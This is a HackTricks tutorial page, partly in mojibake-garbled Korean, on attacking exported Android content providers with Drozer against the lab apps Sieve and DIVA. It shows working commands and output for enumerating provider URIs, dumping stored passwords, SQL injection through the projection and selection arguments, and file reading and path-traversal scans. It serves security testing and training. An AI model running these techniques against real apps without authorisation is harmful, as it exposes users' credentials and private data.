# Exploiting Content Providers

## Exploiting Content Providers

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Intro

ë°ì´í„°ëŠ” **content provider**ë¡œ ì•Œë ¤ì§„ êµ¬ì„± ìš”ì†Œì— ì˜í•´ ìš”ì²­ì— ë”°ë¼ **í•˜ë‚˜ì˜ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ë‹¤ë¥¸ ì• í”Œë¦¬ì¼€ì´ì…˜ìœ¼ë¡œ ì œê³µë©ë‹ˆë‹¤**. ì´ëŸ¬í•œ ìš”ì²­ì€ **ContentResolver class** ë©”ì„œë“œë¥¼ í†µí•´ ê´€ë¦¬ë©ë‹ˆë‹¤. Content providerëŠ” **ë°ì´í„°ë² ì´ìŠ¤**, **íŒŒì¼** ë˜ëŠ” **ë„¤íŠ¸ì›Œí¬**ì™€ ê°™ì€ ë‹¤ì–‘í•œ ìœ„ì¹˜ì— ë°ì´í„°ë¥¼ ì €ì¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

_Manifest.xml_ íŒŒì¼ì—ì„œëŠ” content providerì˜ ì„ ì–¸ì´ í•„ìš”í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´:
```xml
<provider android:name=".DBContentProvider" android:exported="true" android:multiprocess="true" android:authorities="com.mwr.example.sieve.DBContentProvider">
<path-permission android:readPermission="com.mwr.example.sieve.READ_KEYS" android:writePermission="com.mwr.example.sieve.WRITE_KEYS" android:path="/Keys"/>
</provider>
```
`content://com.mwr.example.sieve.DBContentProvider/Keys`ì— ì ‘ê·¼í•˜ë ¤ë©´ `READ_KEYS` ê¶Œí•œì´ í•„ìš”í•©ë‹ˆë‹¤. `/Keys/` ê²½ë¡œê°€ ë‹¤ìŒ ì„¹ì…˜ì—ì„œ ì ‘ê·¼ ê°€ëŠ¥í•˜ë‹¤ëŠ” ì ì´ í¥ë¯¸ë¡­ìŠµë‹ˆë‹¤. ì´ëŠ” ê°œë°œìê°€ `/Keys`ëŠ” ë³´í˜¸í–ˆì§€ë§Œ `/Keys/`ë¥¼ ì„ ì–¸í•˜ëŠ” ì‹¤ìˆ˜ë¥¼ ë²”í–ˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.

**ì•„ë§ˆë„ ê°œì¸ ë°ì´í„°ì— ì ‘ê·¼í•˜ê±°ë‚˜ ì¼ë¶€ ì·¨ì•½ì (SQL Injection ë˜ëŠ” Path Traversal)ì„ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.**

## **ë…¸ì¶œëœ ì½˜í…ì¸  ì œê³µì**ì—ì„œ ì •ë³´ ê°€ì ¸ì˜¤ê¸°
```
dz> run app.provider.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
Authority: com.mwr.example.sieve.DBContentProvider
Read Permission: null
Write Permission: null
Content Provider: com.mwr.example.sieve.DBContentProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
Path Permissions:
Path: /Keys
Type: PATTERN_LITERAL
Read Permission: com.mwr.example.sieve.READ_KEYS
Write Permission: com.mwr.example.sieve.WRITE_KEYS
Authority: com.mwr.example.sieve.FileBackupProvider
Read Permission: null
Write Permission: null
Content Provider: com.mwr.example.sieve.FileBackupProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
```
```
â€œ_content://_â€ìœ¼ë¡œ ì‹œì‘í•˜ëŠ” URIë¥¼ í†µí•´ **DBContentProvider**ì— ë„ë‹¬í•˜ëŠ” ë°©ë²•ì„ ì¡°í•©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì ‘ê·¼ ë°©ì‹ì€ Drozerë¥¼ ì‚¬ìš©í•˜ì—¬ ì–»ì€ í†µì°°ë ¥ì— ê¸°ë°˜í•˜ë©°, ì£¼ìš” ì •ë³´ëŠ” _/Keys_ ë””ë ‰í† ë¦¬ì— ìœ„ì¹˜í•´ ìˆì—ˆìŠµë‹ˆë‹¤.

DrozerëŠ” **ì—¬ëŸ¬ URIë¥¼ ì¶”ì¸¡í•˜ê³  ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**:
```
```
dz> run scanner.provider.finduris -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/
...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/Keys
Accessible content URIs:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
```
You should also check the **ContentProvider code** to search for queries:

![](<../../../.gitbook/assets/image (121) (1) (1) (1).png>)

Also, if you can't find full queries you could **check which names are declared by the ContentProvider** on the `onCreate` method:

![](<../../../.gitbook/assets/image (564).png>)

The query will be like: `content://name.of.package.class/declared_name`

## **ë°ì´í„°ë² ì´ìŠ¤ ê¸°ë°˜ ì½˜í…ì¸  ì œê³µì**

Probably most of the Content Providers are used as **interface** for a **database**. Therefore, if you can access it you could be able to **extract, update, insert and delete** information.\
Check if you can **access sensitive information** or try to change it to **bypass authorisation** mechanisms.

When checking the code of the Content Provider **look** also for **functions** named like: _query, insert, update and delete_:

![](<../../../.gitbook/assets/image (887).png>)

![](<../../../.gitbook/assets/image (254) (1) (1) (1) (1) (1) (1) (1).png>)

Because you will be able to call them

### Query content
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
_id: 1
service: Email
username: incognitoguy50
password: PSFjqXIMVa5NJFudgDuuLVgJYFD+8w==
-
email: incognitoguy50@gmail.com
```
### Insert content

ë°ì´í„°ë² ì´ìŠ¤ë¥¼ ì¿¼ë¦¬í•˜ë©´ **ì—´ì˜ ì´ë¦„**ì„ ì•Œ ìˆ˜ ìˆìœ¼ë©°, ê·¸ í›„ DBì— ë°ì´í„°ë¥¼ ì‚½ì…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

![](<../../../.gitbook/assets/image (98).png>)

![](<../../../.gitbook/assets/image (173).png>)

_ì‚½ì… ë° ì—…ë°ì´íŠ¸ ì‹œ --stringì„ ì‚¬ìš©í•˜ì—¬ ë¬¸ìì—´ì„ ë‚˜íƒ€ë‚´ê³ , --doubleì„ ì‚¬ìš©í•˜ì—¬ ë”ë¸”ì„ ë‚˜íƒ€ë‚´ë©°, --float, --integer, --long, --short, --booleanì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤._

### Update content

ì—´ì˜ ì´ë¦„ì„ ì•Œë©´ **í•­ëª©ì„ ìˆ˜ì •**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

![](<../../../.gitbook/assets/image (780).png>)

### Delete content

![](<../../../.gitbook/assets/image (423).png>)

### **SQL Injection**

**(SQLite)**ì— ëŒ€í•œ SQL ì¸ì ì…˜ì„ í…ŒìŠ¤íŠ¸í•˜ëŠ” ê²ƒì€ **í”„ë¡œì ì…˜** ë° **ì„ íƒ í•„ë“œ**ë¥¼ ì¡°ì‘í•˜ì—¬ ê°„ë‹¨í•©ë‹ˆë‹¤.\
Content Providerë¥¼ ì¿¼ë¦¬í•  ë•Œ ì •ë³´ë¥¼ ê²€ìƒ‰í•˜ê¸° ìœ„í•œ 2ê°œì˜ í¥ë¯¸ë¡œìš´ ì¸ìˆ˜ê°€ ìˆìŠµë‹ˆë‹¤: _--selection_ ë° _--projection_:

![](<../../../.gitbook/assets/image (784).png>)

ì´ **ë§¤ê°œë³€ìˆ˜**ë¥¼ **ì•…ìš©**í•˜ì—¬ **SQL ì¸ì ì…˜**ì„ í…ŒìŠ¤íŠ¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'"
unrecognized token: "')" (code 1): , while compiling: SELECT * FROM Passwords WHERE (')
```

```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "*
FROM SQLITE_MASTER WHERE type='table';--"
| type  | name             | tbl_name         | rootpage | sql              |
| table | android_metadata | android_metadata | 3        | CREATE TABLE ... |
| table | Passwords        | Passwords        | 4        | CREATE TABLE ... |
```
**Drozerì— ì˜í•œ ìë™ SQLInjection ë°œê²¬**
```
dz> run scanner.provider.injection -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Injection in Projection:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
Injection in Selection:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/

dz> run scanner.provider.sqltables -a jakhar.aseem.diva
Scanning jakhar.aseem.diva...
Accessible tables for uri content://jakhar.aseem.diva.provider.notesprovider/notes/:
android_metadata
notes
sqlite_sequence
```
## **íŒŒì¼ ì‹œìŠ¤í…œ ê¸°ë°˜ ì½˜í…ì¸  ì œê³µì**

ì½˜í…ì¸  ì œê³µìëŠ” **íŒŒì¼ì— ì ‘ê·¼í•˜ëŠ” ë°** ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

![](<../../../.gitbook/assets/image (407).png>)

### íŒŒì¼ ì½ê¸°

ì½˜í…ì¸  ì œê³µìì—ì„œ íŒŒì¼ì„ ì½ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
127.0.0.1            localhost
```
### **ê²½ë¡œ íƒìƒ‰**

íŒŒì¼ì— ì ‘ê·¼í•  ìˆ˜ ìˆë‹¤ë©´, ê²½ë¡œ íƒìƒ‰ì„ ì•…ìš©í•´ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ì´ ê²½ìš°ì—ëŠ” í•„ìš”í•˜ì§€ ì•Šì§€ë§Œ "_../_"ì™€ ìœ ì‚¬í•œ íŠ¸ë¦­ì„ ì‚¬ìš©í•´ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤).
```
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
127.0.0.1            localhost
```
**Drozerì— ì˜í•œ ìë™ ê²½ë¡œ íƒìƒ‰ ë°œê²¬**
```
dz> run scanner.provider.traversal -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Vulnerable Providers:
content://com.mwr.example.sieve.FileBackupProvider/
content://com.mwr.example.sieve.FileBackupProvider
```
## References

* [https://www.tutorialspoint.com/android/android\_content\_providers.htm](https://www.tutorialspoint.com/android/android\_content\_providers.htm)
* [https://manifestsecurity.com/android-application-security-part-15/](https://manifestsecurity.com/android-application-security-part-15/)
* [https://labs.withsecure.com/content/dam/labs/docs/mwri-drozer-user-guide-2015-03-23.pdf](https://labs.withsecure.com/content/dam/labs/docs/mwri-drozer-user-guide-2015-03-23.pdf)

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
